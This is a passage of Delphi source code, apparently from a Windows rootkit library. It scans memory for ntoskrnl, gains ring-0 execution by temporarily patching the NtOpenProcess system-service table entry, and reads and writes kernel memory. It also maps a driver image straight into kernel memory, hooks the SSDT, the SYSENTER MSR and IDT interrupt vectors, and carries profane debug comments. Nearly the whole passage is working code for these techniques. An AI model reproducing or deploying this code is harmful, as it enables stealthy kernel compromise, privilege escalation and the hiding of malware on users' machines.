  SizeNormal := 0;
  if (dllh <> 0) then
  begin
    pIDH := Pointer(dllh);
    if (pIDH.e_magic = IMAGE_DOS_SIGNATURE) then
    begin
      pINH := Pointer(dllh+DWord(pIDH^._lfanew));
      if (pINH^.Signature = IMAGE_NT_SIGNATURE) then
      begin
        BaseNormal := pINH^.OptionalHeader.ImageBase;
        SizeNormal := pINH^.OptionalHeader.SizeOfImage;
      end;
    end;
    FreeLibrary(dllh);
  end;

  GlobalMemoryStatus(MemoryStatus);
  Result := 0;
  bFound := False;
  dwLoop := $80000000;
  while (dwLoop < ($80000000 + MemoryStatus.dwTotalPhys)) and (not bFound) do
  begin
    try
      pIDH := MapVirtualAddress(Pointer(dwLoop),SECTION_SIZE*2, False);
      if (pIDH <> nil) then
      begin
        pIDHf := pIDH;
        if (pIDH^.e_magic = IMAGE_DOS_SIGNATURE) and (pIDH^._lfanew+SizeOf(TImageNtHeaders) < SECTION_SIZE) then
        begin
          pINH := Pointer(DWord(pIDH)+DWord(pIDH^._lfanew));
          if (pINH^.Signature = IMAGE_NT_SIGNATURE) and (pINH^.OptionalHeader.SizeOfImage <> 0) then
          begin
            WriteLog('Possible NtOsKrnl Module: '+IntToHex(dwLoop,8));
            pIDH := MapVirtualAddress(Pointer(dwLoop),pINH^.OptionalHeader.SizeOfImage, False);// else
            if (pIDH <> nil) then
            begin
              pINH := Pointer(DWord(pIDH)+DWord(pIDH^._lfanew));
              pExportDirectory := Pointer(DWord(pIDH)+pINH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

              if (DWord(pExportDirectory) = DWord(pIDH)) then
                WriteLog(' ! no export directory for module');

              if (pExportDirectory^.Name = 0) or
                 (pExportDirectory^.Name > pINH^.OptionalHeader.SizeOfImage) then
                 WriteLog(' ! no export name ');

              if (DWord(pExportDirectory) <> DWord(pIDH)) and
                 (pExportDirectory^.Name <> 0) and
                 (pExportDirectory^.Name < pINH^.OptionalHeader.SizeOfImage) then
              begin
                Str := PChar(DWord(pIDH)+pExportDirectory^.Name);
                WriteLog('Module Name at '+IntToHex(dwLoop,8)+' is '+Str);
                if (Length(str) > 3) and (Pos(UpperCase('ntoskrnl'),UpperCase(str)) > 0) then
                begin
                  Result := dwLoop;
                  bFound := True;
                end;
              end;

              WriteLog('ModuleSize: '+IntToHex(pINH^.OptionalHeader.SizeOfImage,8));
              WriteLog('ImageBaseNtHeader: '+IntToHex(pINH^.OptionalHeader.ImageBase,8));

              if (not bFound) then
              begin
                if (BaseNormal <> 0) and (SizeNormal <> 0) and
                  (pINH^.OptionalHeader.SizeOfImage = SizeNormal) and
                  (pINH^.OptionalHeader.ImageBase = BaseNormal) then
                begin
                  Result := dwLoop;
                  bFound := True;
                end;
              end;

              {if (not bFound) then
              begin
                WriteLog('NumberOfNames: '+IntToHex(pExportDirectory^.NumberOfNames,8));
                if (pExportDirectory^.NumberOfNames > 1000) and
                   (pExportDirectory^.NumberOfNames < 1500) then
                begin
                  WriteLog('1500 > NumberOfNames > 1000: ntoskrnl');

                  if (DWord(pExportDirectory^.AddressOfNames) <> 0) and
                     (PDWord(DWord(pIDH)+DWord(pExportDirectory^.AddressOfNames))^ <> 0) then
                     //('ExAcquireFastMutexUnsafe' = PChar(DWord(pIDH)+ PDWord(DWord(pIDH)+DWord(pExportDirectory^.AddressOfNames))^)) then
                  begin
                    Result := dwLoop;
                    bFound := True;
                  end;
                end;
              end;}

              {if (not bFound) and (ExpName <> 0) and (ExpName < pINH^.OptionalHeader.SizeOfImage) then
              begin
                try
                  Str := PChar(DWord(pIDH)+ExpName);
                  WriteLog(' FOUND THIS FUCKING MODULE: '+Str);
                  if (Length(str) > 3) and (Pos(UpperCase('ntoskrnl'),UpperCase(str)) > 0) then
                  begin
                    Result := dwLoop;
                    bFound := True;
                  end;
                except;
                  WriteLog(' MODULE EXPORT FUCKED @ '+inttoHex(dwLoop,8));
                end;
              end;}

            end else
              WriteLog(' ! cant map whole library');
            UnmapVirtualAddress(pIDH);
          end;
        end;
        UnmapVirtualAddress(pIDHf);
      end;
    except
    end;
    Inc(dwLoop,SECTION_SIZE);
  end;
  if (Result = 0) then
    WriteLog('Error in SearchNtOsKrnl');
end;

var
  PhysParam: DWord;
  PhysParam2: Pointer;
  PhysReturn: Pointer;

function Ring0AllocatePhysMemorySSDT: DWord; stdcall;
asm
  PUSH DWORD PTR [PhysParam]
  CALL DWORD PTR [MmAllocateNonCachedMemory]
  MOV DWORD PTR [PhysReturn], EAX
  RET
end;
function Ring0AllocatePhysMemoryENDSSDT: DWord; asm end;


function Ring0FreePhysMemorySSDT: DWord; stdcall;
asm
  PUSH DWORD PTR [PhysParam]
  PUSH DWORD PTR [PhysParam2]
  CALL DWORD PTR [MmFreeNonCachedMemory]
  RET
end;
function Ring0FreePhysMemoryENDSSDT: DWord; asm end;

function GetKernelProcAddress(dwModuleHandle: DWord; pFunctionName: PChar): Pointer; stdcall;
var
  pMemory: Pointer;
  pGPA: Pointer;
  dllh: DWord;
begin
  Result := nil;
  pMemory := MapVirtualAddress(Pointer(dwModuleHandle),GetKernelModuleSize(dwModuleHandle), false);
  if (pMemory <> nil) then
  begin
    pGPA := GetProcAddressX(DWord(pMemory),pFunctionName);
    if (pGPA <> nil) then
      Result :=  Pointer( DWord(pGPA) - DWord(pMemory) + dwModuleHandle );
    UnmapVirtualAddress(pMemory);
  end;
  if (Result = nil) then
  begin
    if (dwModuleHandle = ntoskrnl) then
    begin
      dllh := LoadLibraryEx('ntoskrnl.exe',0,DONT_RESOLVE_DLL_REFERENCES);
      Result := Pointer(DWord(GetProcAddress(dllh,pFunctionName)) - DWord(dllh) + dwModuleHandle);
      FreeLibrary(dllh);
    end;
  end;


//  if (Result = nil) then
//    WriteLog('Error in GetKernelProcAddress - Handle: ' + InttoHex(dwModuleHandle,8) + ' Function Name: '+pFunctionName);
end;

function KeServiceDescriptorTable: Pointer; stdcall;
begin
  Result := nil;
  if (KeServiceDescriptorTableAddr <> nil) then
    Result := KeServiceDescriptorTableAddr;
end;


function AllocatePhysMemorySSDT(dwMemSize: DWord): Pointer; stdcall;
begin
  Result := nil;
  PhysReturn := nil;
  if (@MmAllocateNonCachedMemory = nil) then
    Exit;
  PhysParam := dwMemSize;
  if (EnterRing0ViaSSDT( @Ring0AllocatePhysMemorySSDT,
                        DWord(@Ring0AllocatePhysMemoryENDSSDT)-DWord(@Ring0AllocatePhysMemorySSDT))) then
    Result := Pointer(PhysReturn);
end;

procedure FreePhysMemorySSDT(pMemAddr: Pointer; dwMemSize: DWord); stdcall;
begin
  if (@MmFreeNonCachedMemory = nil) then
    Exit;
  PhysParam := dwMemSize;
  PhysParam2 := pMemAddr;
  EnterRing0ViaSSDT( @Ring0FreePhysMemorySSDT,
                        DWord(@Ring0FreePhysMemoryENDSSDT)-DWord(@Ring0FreePhysMemorySSDT));
end;

// ----------------------
// ALLOCATE RING 0 MEMORY
// ----------------------

var
  CPhysReturn: Pointer;
  CPhysParam: DWord;
  CPhysParam2: TPhysicalAddress;

procedure Ring0MmAllocateContiguousMemorySSDT; stdcall;
begin
  CPhysReturn := MmAllocateContiguousMemory(CPhysParam,CPhysParam2);
end;
procedure Ring0MmAllocateContiguousMemoryENDSSDT; asm end;

function MmAllocateContiguousMemorySSDT(dwMemSize: DWord): Pointer; stdcall;
begin
  Result := nil;
  CPhysReturn := nil;
  if (@MmAllocateContiguousMemory = nil) then
    Exit;
  CPhysParam := dwMemSize;
  CPhysParam2.HighPart := $0;
  CPhysParam2.LowPart := $FFFFFFFF;
  if (EnterRing0ViaSSDT( @Ring0MmAllocateContiguousMemorySSDT,
                        DWord(@Ring0MmAllocateContiguousMemoryENDSSDT)-DWord(@MmAllocateContiguousMemorySSDT))) then
    Result := Pointer(CPhysReturn);
end;

// --------------------------
// ALLOCATE RING 0 MEMORY END
// --------------------------

// ------------------
// FREE RING 0 MEMORY
// ------------------

var CVirtualParam: DWord;
procedure Ring0MmFreeContiguousMemorySSDT; stdcall;
begin
  MmFreeContiguousMemory(CVirtualParam);
end;
procedure Ring0MmFreeContiguousMemoryENDSSDT; asm end;

procedure MmFreeContiguousMemorySSDT(pAddress: Pointer); stdcall;
begin
  CVirtualParam := DWord(pAddress);
  if (@MmFreeContiguousMemory = nil) then
    Exit;
  if (EnterRing0ViaSSDT( @Ring0MmFreeContiguousMemorySSDT,
                        DWord(@Ring0MmFreeContiguousMemoryENDSSDT)-DWord(@MmFreeContiguousMemorySSDT))) then
end;

// ----------------------
// FREE RING 0 MEMORY END
// ----------------------



var
  Ring3SSDT: Pointer;

procedure SSGTCallBack;
asm
  PUSH EAX
  PUSH EBX
  MOV EAX, $12345678
  MOV EBX, $12345678
  MOV DWORD PTR [EAX], EBX
  ADD EAX, 4
  MOV EBX, $12345678
  MOV DWORD PTR [EAX], EBX
  POP EBX
  POP EBX
  CMP [ESP+$8], $1337
  JNE @@CallNormal
  MOV EAX, DWORD PTR [Ring3SSDT]
  CALL EAX
  RET $10
@@CallNormal:
  SUB EAX, 4
  JMP EAX
end;
procedure SSGTCallBackEnd; asm end;

function GetServiceAddressByIndex(dwIndex: DWord): DWord; stdcall;
begin
  Result := 0;
  if (dwIndex <= $1FF) then
    Result := SSDTArray[dwIndex];
end;

function GetServiceCountSSDT: DWord; stdcall;
var
  SSDT: PSSDT;
  Ki: DWord;
  SSDTE: Pointer;
  i: DWord;
  Finished: Boolean;
begin
  Result := 0;
  KI  := DWord(KeServiceDescriptorTable);
  if (KI = 0) then
    Exit;

  SSDT := Pointer(DWord(MapVirtualAddress(Pointer(Ki and $FFFFF000),SizeOf(TSSDT),False))+(Ki and $FFF));
  if (SSDT = nil) then
    Exit;

  SSDTE := Pointer(DWord(MapVirtualAddress(Pointer(DWord(SSDT^.pSSAT) and $FFFFF000),$2000,False))+(DWord(SSDT^.pSSAT) and $FFF));
  if (SSDTE <> nil) then
  begin
    i := 0;
    repeat
      SSDTArray[i] := PDWord(DWord(SSDTE)+i*SizeOf(DWord))^;
      Inc(i);
      Finished := (PDWord(DWord(SSDTE)+i*SizeOf(DWord))^ = 0) or (PDWord(DWord(SSDTE)+i*SizeOf(DWord))^ = i);
    until (i > $1FF) or (Finished);
    Result := i;
    UnmapVirtualAddress(Pointer(DWord(SSDTE) and $FFFFF000));
  end;
  UnmapVirtualAddress(Pointer(DWord(SSDT) and $FFFFF000));
end;


procedure SSGTIndexCallback;
asm
  MOV EAX, $12345678
  MOV EBX, $12345678
  MOV DWORD PTR [EAX], EBX
  CMP DWORD PTR [ESP+$8], $1337
  JNE @@CallNormal
  MOV EAX, DWORD PTR [Ring3SSDT]
  CALL EAX
  MOV EAX, DWORD PTR [ESP+$0C]
  TEST EAX, EAX
  JZ @@nochange
  MOV DWORD PTR [EAX], $1337
@@nochange:
  XOR EAX, EAX

  RET $10
  @@CallNormal:
  JMP EBX
end;
procedure SSGTIndexCallbackEnd; asm end;

function EnterRing0viaSSDT(pFunction: Pointer; dwFunctionsize: DWord): Boolean; stdcall;
var
  SSDT: PSSDT;
  Ki: Pointer;
  SSDTE: Pointer;
  IndexOP: DWord;
  NtOpenProcess: Pointer;
  ntdll: DWord;
  pSaveMem: Pointer;
  SSGTCallbackSize: DWord;
  pMap: Pointer;
begin
  Result := False;

  SSGTCallbackSize := DWord(@SSGTIndexCallbackEnd)-DWord(@SSGTIndexCallback);
  Ring3SSDT := pFunction;

  if (ntoskrnl = 0) then
    Exit;
  if (ntoskrnlSize = 0) then
    Exit;

  ntdll := GetModuleHandle('ntdll.dll');
  if (ntdll = 0) then
    Exit;

  NtOpenProcess := GetProcAddress(ntdll,'NtOpenProcess');
  if (NtOpenProcess = nil) then
    Exit;

  IndexOP := PDWord(DWord(NtOpenProcess)+1)^;
  if (IndexOP = 0) or (IndexOP > $FF) then
    Exit;

  KI  := KeServiceDescriptorTable;
  if (KI = nil) then
    Exit;

  SSDT := Pointer(DWord(MapVirtualAddress(Pointer(DWord(Ki) and $FFFFF000),SizeOf(TSSDT),False)));
  if (SSDT = nil) then
    Exit;

  SSDT := Pointer(DWord(SSDT)+(DWord(Ki) and $FFF));

  SSDTE := Pointer(DWord(MapVirtualAddress(Pointer(DWord(SSDT^.pSSAT) and $FFFFF000),$2000,True)));
  if (SSDTE <> nil) and (not isBadWritePtr(SSDTE,1)) then
  begin
    SSDTE := Pointer(DWord(SSDTE)+(DWord(SSDT^.pSSAT) and $FFF));

    pSaveMem := VirtualAlloc(nil,SSGTCallbackSize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if (pSaveMem <> nil) then
    begin

      pMap := MapVirtualAddress(Pointer(ntoskrnl),ntoskrnlSize,True);
      if (pMap <> nil) then
      begin
        VirtualLock(pFunction, dwFunctionSize);
        try
          CopyMemory(pSaveMem, pMap, SSGTCallbackSize);
          CopyMemory(Pointer(DWord(pMap)),@SSGTIndexCallback, SSGTCallbackSize);

          PPointer(DWord(pMap)+1)^ := Pointer(DWord(SSDTE)+IndexOP*SizeOf(DWord));
          PPointer(DWord(pMap)+6)^ := PPointer(DWord(SSDTE)+IndexOP*SizeOf(DWord))^;

          SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
          PPointer(DWord(SSDTE)+IndexOP*SizeOf(DWord))^ := Pointer(ntoskrnl);
          Result := OpenProcess($1337, False, $1337) = $1337;
        finally
          SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_NORMAL);
        end;
        CopyMemory(pMap, pSaveMem, SSGTCallbackSize);
        VirtualUnLock(pFunction, dwFunctionSize);

        VirtualFree(pSaveMem,SSGTCallBackSize,MEM_DECOMMIT);
        UnmapVirtualAddress(pMap);
      end;
      VirtualFree(pSaveMem,SSGTCallbackSize,MEM_DECOMMIT);
    end;
    UnmapVirtualAddress(Pointer(DWord(SSDTE) and $FFFFF000));
  end;
  UnmapVirtualAddress(Pointer(DWord(SSDT) and $FFFFF000));
end;

function EnterRing0viaSSDT2(pFunction: Pointer; dwFunctionsize: DWord): Boolean; stdcall;
var
  ZW: Pointer;
  pMap: Pointer;
  SSGTCallbackSize: DWord;
  pSaveMem: Pointer;
begin
  Ring3SSDT := pFunction;
  SSGTCallbackSize := DWord(@SSGTCallbackEND)-DWORD(@SSGTCallback);
  Result := False;

  if (ntoskrnl = 0) then
    Exit;

  if (ntoskrnlsize= 0) then
    Exit;

  pMap := MapVirtualAddress(Pointer(ntoskrnl), ntoskrnlsize, True);
  if (pMap = nil) then
    Exit;

  ZW := GetProcAddressX(DWord(pMap), 'NtOpenProcess');
  if (ZW = nil) then
    Exit;
  pSaveMem := VirtualAlloc(nil,SSGTCallbackSize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE);
  if (pSaveMem <> nil) then
  begin
    SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
    VirtualLock(pFunction, dwFunctionSize);
    CopyMemory(pSaveMem, pMap, SSGTCallbackSize);
    CopyMemory(Pointer(DWord(pMap)),@SSGTCallBack, SSGTCallbackSize);

    PPointer(DWord(pMap)+3)^ := ZW; //Pointer(DWord(ZW)-DWord(pMap)+ntoskrnl);
    PDWord(DWord(pMap)+8)^ := PDWord(DWORD(ZW)+0)^;
    PDWord(DWord(pMap)+18)^ := PDWord(DWORD(ZW)+4)^;

    pByte(DWord(ZW)+0)^ := $68;
    pPointer(DWord(ZW)+1)^ := Pointer(ntoskrnl);
    pByte(DWord(ZW)+5)^ := $C3;

    Result := OpenProcess($1337, False, $1337) = $1337;
    CopyMemory(pMap, pSaveMem, SSGTCallbackSize);
    VirtualUnLock(pFunction, dwFunctionSize);
    SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_NORMAL);

    VirtualFree(pSaveMem,SSGTCallbackSize,MEM_DECOMMIT);
  end;
  UnmapVirtualAddress(pMap);
end;

var
  CKMret: Boolean;
  CKMto,
  CKMfrom,
  CKMsize: DWord;

procedure Ring0CopyKernelMem;
asm
  PUSHAD
  MOV EAX, DWORD PTR [CKMto]
  MOV EBX, DWORD PTR [CKMfrom]
  MOV ECX, DWORD PTR [CKMsize]
  JMP @@in
@@loop:
  MOV DL, BYTE PTR [EBX]
  MOV BYTE PTR [EAX], DL

  INC EAX
  INC EBX
  DEC ECX
@@in:
  TEST ECX, ECX
  JNZ @@loop
  MOV DWORD PTR [CKMret], TRUE
  POPAD
end;
procedure Ring0CopyKernelMemEnd; asm end;


function CopyKernelMem(a, b: Pointer; s: DWord): Boolean; stdcall;
begin
  Result := False;
  CKMret := False;
  CKMto := DWord(a);
  CKMfrom := DWord(b);
  CKMsize := s;
  if EnterRing0viaSSDT(@Ring0CopyKernelMem,DWord(@Ring0CopyKernelMemEnd)-DWord(@Ring0CopyKernelMem)) and
    (CKMret) then
    Result := True;
end;

procedure UnloadDriver(dwDriverHandle: DWord); stdcall;
begin
  if (dwDriverHandle <> 0) then
    MmFreeContiguousMemorySSDT(Pointer(dwDriverHandle));
end;

function LoadAsDriver(FileName: PChar): DWord; stdcall;
var
  IDH        : PImageDosHeader;
  INH        : PImageNtHeaders;
  SEC        : PImageSectionHeader;
  dwread     : DWord;
  dwSecCount : DWord;
  dwFileSize : DWord;
  dwMemSize  : DWord;
  i          : Integer;
  iFileHandle: Integer;
  pFileMem   : Pointer;
  pAll       : Pointer;
  sLibraryName : String;
  pTargetMem : Pointer;
begin
  Result := 0;
  sLibraryName := ParamStr(0);
  iFileHandle := CreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, 0);

  if (iFileHandle < 0) then
  begin
    Exit;
  end;

  dwFileSize := GetFileSize(iFileHandle, nil);
  if (dwFileSize = 0) then
  begin
    CloseHandle(iFileHandle);
    Exit;
  end;

  pFileMem := VirtualAlloc(nil, dwFileSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (pFileMem = nil) then
  begin
    CloseHandle(iFileHandle);
    Exit;
  end;

  ReadFile(iFileHandle, pFileMem^, dwFileSize, dwRead, nil);
  IDH := pFileMem;
  if (isBadReadPtr(IDH,SizeOf(TImageDosHeader))) or
     (IDH^.e_magic <> IMAGE_DOS_SIGNATURE) then
  begin
    VirtualFree(pFileMem,dwFileSize,MEM_DECOMMIT);
    CloseHandle(iFileHandle);
    Exit;
  end;

  INH := Pointer(DWord(pFileMem) + DWord(IDH^._lfanew));
  if (isBadReadPtr(INH, SizeOf(TImageNtHeaders))) or
     (INH^.Signature <> IMAGE_NT_SIGNATURE) then
  begin
    VirtualFree(pFileMem,dwFileSize,MEM_DECOMMIT);
    CloseHandle(iFileHandle);
    Exit;
  end;

  SEC := Pointer(Integer(INH)+SizeOf(TImageNtHeaders));
  dwMemSize := INH^.OptionalHeader.SizeOfImage;
  if (dwMemSize = 0) then
  begin
    VirtualFree(pFileMem, dwFileSize, MEM_DECOMMIT);
    CloseHandle(iFileHandle);
    Exit;
  end;

  pAll := VirtualAlloc(nil,dwMemSize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE);
  if (pAll = nil) then
  begin
    VirtualFree(pFileMem, dwFileSize, MEM_DECOMMIT);
    CloseHandle(iFileHandle);
    Exit;
  end;

  pTargetMem := MmAllocateContiguousMemorySSDT(dwMemSize);
  //pTargetMem := AllocatePhysMemorySSDT(dwMemSize);

  if (pTargetMem = nil) then
  begin
    VirtualFree(pFileMem, dwFileSize, MEM_DECOMMIT);
    VirtualFree(pAll,dwMemSize, MEM_DECOMMIT);
    CloseHandle(iFileHandle);
    Exit;
  end;


  dwSecCount := INH^.FileHeader.NumberOfSections;
  CopyMemory(pAll, IDH, DWord(SEC)-DWord(IDH)+dwSecCount*SizeOf(TImageSectionHeader));
  for i := 0 to dwSecCount-1 do
  begin
    CopyMemory(Pointer(DWord(pAll) + SEC^.VirtualAddress),
      Pointer(DWord(pFileMem) + DWord(SEC^.PointerToRawData)),
      SEC^.SizeOfRawData);
    SEC := Pointer(Integer(SEC) + SizeOf(TImageSectionHeader));
  end;

  ChangeReloc(Pointer(INH^.OptionalHeader.ImageBase),
              pAll,
              Pointer(DWord(pAll)+INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress),
              pTargetMem,
              INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);
  CreateImportTable(pAll, Pointer(DWord(pAll)+INH^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress));

  if WriteKernelMemory(pTargetMem,pAll,dwMemSize, True) then
  begin
    Result := DWord(pTargetMem);
    WriteLog('Driver successful loaded at '+inttohex(Result,8));
  end;

  VirtualFree(pAll, dwMemSize, MEM_DECOMMIT);
  VirtualFree(pFileMem, dwFileSize, MEM_DECOMMIT);
  CloseHandle(iFileHandle);
end;

procedure CreateImportTable(pLibraryHandle, pImportTable: pointer); stdcall;
var pIBlock        : PImportBlock;
    pThunksRead    : PDWord;
    pThunksWrite   : PDWord;
    pDllName       : PChar;
    dwLibraryHandle: DWord;
    dwOldProtect   : DWord;
begin
  pIBlock := pImportTable;
  while (not isBadReadPtr(pIBlock,SizeOf(TImportBlock))) and
        (pIBlock^.pFirstThunk <> nil) and (pIBlock^.dwName <> 0) do
  begin
    pDllName := Pointer(DWord(pLibraryHandle)+DWord(pIBlock^.dwName));
    if (not isBadReadPtr(pDllName,4)) then
    begin
      dwLibraryHandle := GetKernelModuleHandle(pDllName);
      pThunksRead := Pointer(DWord(pIBlock^.pFirstThunk)+DWord(pLibraryHandle));
      pThunksWrite := pThunksRead;
      if (DWord(pIBlock^.dwTimeDateStamp) = $FFFFFFFF) then
        pThunksRead := Pointer(DWord(pIBlock^.dwCharacteristics)+DWord(pLibraryHandle));
      while (not isBadReadPtr(pThunksRead,SizeOf(DWord))) and
            (not isBadReadPtr(pThunksWrite,SizeOf(Word))) and
            (pThunksRead^ <> 0) do
      begin
        if VirtualProtect(pThunksWrite,SizeOf(DWord),PAGE_EXECUTE_READWRITE,dwOldProtect) then
        begin
          if (DWord(pThunksRead^) and  $80000000 <> 0) then
            pThunksWrite^ := DWord(GetKernelProcAddress(dwLibraryHandle,PChar(pThunksRead^ and $FFFF))) else
            pThunksWrite^ := DWord(GetKernelProcAddress(dwLibraryHandle,PChar(DWord(pLibraryHandle)+pThunksRead^+SizeOf(Word))));
          VirtualProtect(pThunksWrite,SizeOf(DWord),dwOldProtect,dwOldProtect);
        end;
        Inc(pThunksRead);
        Inc(pThunksWrite);
      end;
    end;
    pIBlock := Pointer(DWord(pIBlock)+SizeOf(TImportBlock));
  end;
end;


function ReadKernelMemory(pDest, pSource: Pointer; dwSize: DWord; bForce: Boolean): Boolean; stdcall;
var
  pMap: Pointer;
begin
  Result := False;
  pMap := MapVirtualAddress(Pointer(DWord(pSource) and $FFFFF000),dwSize+DWord(pSource) and $FFF, False);
  if (pMap <> nil) then
  begin
    pMap := Pointer(DWord(pMap)+DWord(pSource) and $FFF);
    CopyMemory(pDest, pMap, dwSize);
    Result := True;
    UnmapVirtualAddress(Pointer(DWord(pMap) and $FFFFF000));
  end else
    if (bForce) and CopyKernelMem(pDest, pSource, dwSize) then
      Result := True;

//  if (Not Result) then
//    WriteLog('Error in ReadKernelMemory - SourceAddress: '+IntToHex(DWord(pDest),8)+' Size: '+IntToHex(dwSize,8))
end;

function WriteKernelMemory(pDest, pSource: Pointer; dwSize: DWord; bForce: Boolean): Boolean; stdcall;
var
  pMap: Pointer;
begin
  Result := False;
  pMap := MapVirtualAddress(Pointer(DWord(pDest) and $FFFFF000),dwSize+DWord(pDest) and $FFF,True);
  if (pMap <> nil) then
  begin
    pMap := Pointer(DWord(pMap)+DWord(pDest) and $FFF);
    CopyMemory(pMap,pSource,dwSize);
    Result := True;
    UnmapVirtualAddress(Pointer(DWord(pMap) and $FFFFF000));
  end else
    if (bForce) and CopyKernelMem(pDest,pSource,dwSize) then
      Result := True;

//  if (Not Result) then
//    WriteLog('Error in WriteKernelMemory - DestAddress: '+IntToHex(DWord(pDest),8)+' Size: '+IntToHex(dwSize,8))
end;


function HookSSDT(pFunctionName: PChar; dwDriver: DWord; pCallBackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
var
  SSDT: PSSDT;
  Ki: Pointer;
  SSDTE: Pointer;
  ntdll: DWord;
  pFunc: Pointer;
  Index: DWord;
begin
  Result := False;
  pCallbackFunction := Pointer(DWord(pCallBackFunction)-GetModuleHandle(nil)+dwDriver);

  ntdll := GetModuleHandle('ntdll.dll');
  if (ntdll = 0) then
    Exit;

  pFunc := GetProcAddress(ntdll,pFunctionName);
  if (pFunc = nil) then
    Exit;

  Index := PDWord(DWord(pFunc)+1)^;
  if (Index > $FF) then
    Exit;

  KI  := KeServiceDescriptorTable;
  if (Ki = nil) then
    Exit;

  SSDT := Pointer(DWord(MapVirtualAddress(Pointer(DWord(Ki) and $FFFFF000),SizeOf(TSSDT),False))+(DWord(Ki) and $FFF));
  if (SSDT = nil) then
    Exit;

  SSDTE := Pointer(DWord(MapVirtualAddress(Pointer(DWord(SSDT^.pSSAT) and $FFFFF000),$2000,True))+(DWord(SSDT^.pSSAT) and $FFF));
  if (SSDTE <> nil) then
  begin
    pOrigFunction := PPointer(DWord(SSDTE)+Index*SizeOf(DWord))^;
    if WriteKernelMemory(Pointer(DWord(@pOrigFunction)-GetModuleHandle(nil)+dwDriver),@pOrigFunction,4, True) then
    begin
      Result := True;
      PPointer(DWord(SSDTE)+Index*SizeOf(DWord))^ := pCallBackFunction;
    end;
    UnmapVirtualAddress(Pointer(DWord(SSDTE) and $FFFFF000));
  end;
  UnmapVirtualAddress(Pointer(DWord(SSDT) and $FFFFF000));
end;

function UnhookSSDT(pFunctionName: PChar; pOrigFunction: Pointer): Boolean; stdcall;
var
  SSDT: PSSDT;
  Ki: Pointer;
  SSDTE: Pointer;
  ntdll: DWord;
  pFunc: Pointer;
  Index: DWord;
begin
  Result := False;

  ntdll := GetModuleHandle('ntdll.dll');
  if (ntdll = 0) then
    Exit;

  pFunc := GetProcAddress(ntdll,pFunctionName);
  if (pFunc = nil) then
    Exit;

  Index := PDWord(DWord(pFunc)+1)^;
  if (Index > $FF) then
    Exit;

  KI  := KeServiceDescriptorTable;
  if (Ki = nil) then
    Exit;

  SSDT := Pointer(DWord(MapVirtualAddress(Pointer(DWord(Ki) and $FFFFF000),SizeOf(TSSDT),False))+(DWord(Ki) and $FFF));
  if (SSDT = nil) then
    Exit;

  SSDTE := Pointer(DWord(MapVirtualAddress(Pointer(DWord(SSDT^.pSSAT) and $FFFFF000),$2000,True))+(DWord(SSDT^.pSSAT) and $FFF));
  if (SSDTE <> nil) then
  begin
    Result := True;
    PPointer(DWord(SSDTE)+Index*SizeOf(DWord))^ := pOrigFunction;
    UnmapVirtualAddress(Pointer(DWord(SSDTE) and $FFFFF000));
  end;
  UnmapVirtualAddress(Pointer(DWord(SSDT) and $FFFFF000));
end;




// -------------------
// SYSENTER HOOK BEGIN
// -------------------

var
  SysEnterOld: DWord;
  SysEnterNew: DWord;
  SysTo: DWord;

procedure InstallSysEnterHookRing0;
asm
  mov eax, 1
  cpuid
  mov eax, 1
  shl eax, 5
  and edx, eax

  test edx, edx
  jz @@__not_supported

  mov eax, 1
  cpuid
  mov eax, 1
  shl eax, 11
  and edx, eax

  test edx, edx
  jz @@__not_supported

  mov ecx, $176
  rdmsr
  test eax, eax
  jz @@__not_supported

  mov [SysenterOld], eax
  mov ecx, [SysTo]
  mov [ecx], eax
  mov eax, [SysenterNew]
  xor edx, edx
  mov ecx, $176
  wrmsr

@@__not_supported:
  ret
end;
procedure InstallSysEnterHookRing0End; asm end;

function HookSysEnter(dwDriver: DWord; pCallbackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
begin
  Result := True;
  if (DWord(pCallbackFunction) < $80000000) then
    pCallbackFunction := Pointer(DWord(pCallbackFunction)-GetModuleHandle(nil)+dwDriver);

  SysenterNew := DWord(pCallbackFunction);
  SysEnterOld := 0;
  SysTo := DWord(@pOrigFunction)-GetModuleHandle(nil)+dwDriver;
  if EnterRing0ViaSSDT(@InstallSysEnterHookRing0, DWord(@InstallSysEnterHookRing0End) - DWord(@InstallSysEnterHookRing0)) then
  begin
    pOrigFunction := Pointer(SysEnterOld);
    Result := SysEnterOld <> 0;
  end;
end;

// -----------------
// SYSENTER HOOK END
// -----------------

function HookInterrupt(bNumber: Byte; dwDriver: DWord; pCallbackFunction: Pointer; var pOrigFunction: Pointer): Boolean; stdcall;
var
  BaseAddress: Pointer;
  cg: PCallGateDescriptor;
  IDT: TGDT;
begin
  Result := False;
  if (DWord(pCallbackFunction) < $80000000) then
    pCallbackFunction := Pointer(DWord(pCallbackFunction)-GetModuleHandle(nil)+dwDriver);
  asm
    SIDT DWORD PTR [IDT]
  end;
  BaseAddress := MapVirtualAddress(Pointer(((IDT.wBaseHigh shl $10) or IDT.wBaseLow) and $FFFFF000),(IDT.wLimit+1), True);
  if (BaseAddress = nil) then
    Exit;
  BaseAddress := Pointer(DWord(BaseAddress)+IDT.wBaseLow and $FFF);
  cg := Pointer(DWord(BaseAddress)+8*bNumber);
  pOrigFunction := Pointer((cg^.Offset_16_31 shl $10) or cg^.Offset_0_15);
  if WriteKernelMemory(Pointer(DWord(@pOrigFunction)-GetModuleHandle(nil)+dwDriver),@pOrigFunction,4, True) then
  begin
    Result := True;
    cg^.Offset_0_15 := DWord(pCallbackFunction) and $FFFF;
    cg^.Offset_16_31 := DWord(pCallbackFunction) shr $10;
  end;
